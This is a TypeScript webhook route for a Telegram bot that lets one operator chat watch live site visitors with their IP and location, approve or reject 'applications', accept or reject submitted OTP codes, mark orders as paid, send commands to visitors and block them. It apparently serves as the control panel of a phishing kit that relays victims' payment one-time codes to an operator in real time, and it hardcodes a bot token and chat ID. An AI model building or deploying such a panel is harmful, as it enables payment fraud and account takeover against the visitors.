import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";

const BOT_TOKEN = "8645943240:AAF4qNTe4VjrWLIzZKBSc6wn6OScSB39_PA";
const CHAT_ID = "8747840160";
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

// eslint-disable-next-line @typescript-eslint/no-explicit-any
let _sb: any = null;
// eslint-disable-next-line @typescript-eslint/no-explicit-any
function sb(): any {
  if (!_sb) {
    const url = process.env.SUPABASE_URL || process.env.VITE_SUPABASE_URL!;
    const key =
      process.env.SUPABASE_SERVICE_ROLE_KEY ||
      process.env.SUPABASE_PUBLISHABLE_KEY ||
      process.env.VITE_SUPABASE_PUBLISHABLE_KEY!;
    _sb = createClient(url, key, { auth: { persistSession: false } });
  }
  return _sb;
}

async function tg(method: string, body: Record<string, unknown>) {
  return fetch(`${TG}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

async function sendMessage(text: string, reply_markup?: unknown) {
  await tg("sendMessage", {
    chat_id: CHAT_ID,
    text,
    parse_mode: "HTML",
    disable_web_page_preview: true,
    reply_markup,
  });
}

async function answerCallback(id: string, text?: string) {
  await tg("answerCallbackQuery", { callback_query_id: id, text });
}

async function listVisitors() {
  const since = new Date(Date.now() - 30_000).toISOString();
  const { data, error } = await sb()
    .from("visitor_sessions")
    .select("visitor_id, path, city, country, ip, last_seen")
    .gte("last_seen", since)
    .order("last_seen", { ascending: false })
    .limit(50);
  if (error) return { count: 0, rows: [] as any[] };
  const rows = (data as any[]) || [];
  return { count: rows.length, rows };
}

async function handleVisitorsCommand() {
  const { count, rows } = await listVisitors();
  if (count === 0) {
    await sendMessage("👥 <b>الزوار المتصلون الآن:</b> 0");
    return;
  }
  const lines = [`👥 <b>الزوار المتصلون الآن:</b> ${count}`, ""];
  for (const r of rows.slice(0, 20)) {
    const loc = [r.city, r.country].filter(Boolean).join(", ") || "—";
    lines.push(
      `• <code>${r.visitor_id}</code>\n   📍 ${loc}  •  🔗 ${r.path || "/"}`,
    );
  }
  // Per-visitor action keyboard
  const keyboard = rows.slice(0, 20).map((r: any) => [
    { text: `✅ قبول ${r.visitor_id}`, callback_data: `v_ok:${r.visitor_id}` },
    { text: `❌ رفض ${r.visitor_id}`, callback_data: `v_no:${r.visitor_id}` },
  ]);
  await sendMessage(lines.join("\n"), { inline_keyboard: keyboard });
}

async function sendMainMenu() {
  await sendMessage("🤖 اختر إجراء:", {
    inline_keyboard: [
      [{ text: "👥 الزوار المتصلون", callback_data: "visitors" }],
    ],
  });
}

async function updateApp(id: string, patch: Record<string, unknown>) {
  const { error } = await sb().from("applications").update(patch).eq("id", id);
  return !error;
}

async function sendVisitorCommand(visitorId: string, command: string, payload?: string) {
  await sb().from("visitor_commands").insert({
    visitor_id: visitorId,
    command,
    payload: payload ?? null,
  });
}

async function handleUpdate(update: any) {
  // Idempotency
  if (typeof update.update_id === "number") {
    const { error } = await sb()
      .from("telegram_updates")
      .insert({ update_id: update.update_id });
    if (error) return; // already seen
  }

  // Only accept messages from the configured chat
  const msg = update.message || update.edited_message;
  const cq = update.callback_query;
  const incomingChatId = String(msg?.chat?.id ?? cq?.message?.chat?.id ?? "");
  if (incomingChatId && incomingChatId !== CHAT_ID) return;

  if (msg?.text) {
    const text = String(msg.text).trim();
    if (text === "/start" || text === "/menu") {
      await sendMainMenu();
      return;
    }
    if (text === "/visitors" || text === "👥" || text === "الزوار") {
      await handleVisitorsCommand();
      return;
    }
    await sendMainMenu();
    return;
  }

  if (cq?.data) {
    const data = String(cq.data);
    await answerCallback(cq.id);
    const [action, id] = data.split(":");

    if (action === "visitors") {
      await handleVisitorsCommand();
      return;
    }
    if (action === "approve" && id) {
      await updateApp(id, { review_status: "approved" });
      await sendMessage(`✅ تم القبول للطلب <code>${id}</code> — بانتظار الـ OTP`);
      return;
    }
    if (action === "reject" && id) {
      await updateApp(id, { review_status: "rejected" });
      await sendMessage(`❌ تم رفض الطلب <code>${id}</code>`);
      return;
    }
    if (action === "otp_ok" && id) {
      await updateApp(id, { review_status: "completed", status: "paid" });
      await sendMessage(`✅ تم إتمام الدفع للطلب <code>${id}</code>`);
      return;
    }
    if (action === "otp_reject" && id) {
      await updateApp(id, { review_status: "otp_rejected" });
      await sendMessage(`❌ تم رفض الـ OTP للطلب <code>${id}</code>`);
      return;
    }
    if (action === "v_ok" && id) {
      // "accept" the visitor — leave them on the site, confirm
      await sendMessage(`✅ تم قبول الزائر <code>${id}</code>`);
      return;
    }
    if (action === "v_no" && id) {
      // "reject" the visitor — block them
      await sb().from("blocked_visitors").insert({
        visitor_id: id,
        reason: "rejected via telegram",
      });
      await sendMessage(`❌ تم رفض وحظر الزائر <code>${id}</code>`);
      return;
    }
  }
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      GET: async () => Response.json({ ok: true }),
      POST: async ({ request }: { request: Request }) => {
        try {
          const update = await request.json();
          await handleUpdate(update);
        } catch (e) {
          console.error("[telegram webhook]", e);
        }
        return Response.json({ ok: true });
      },
    },
  },
});
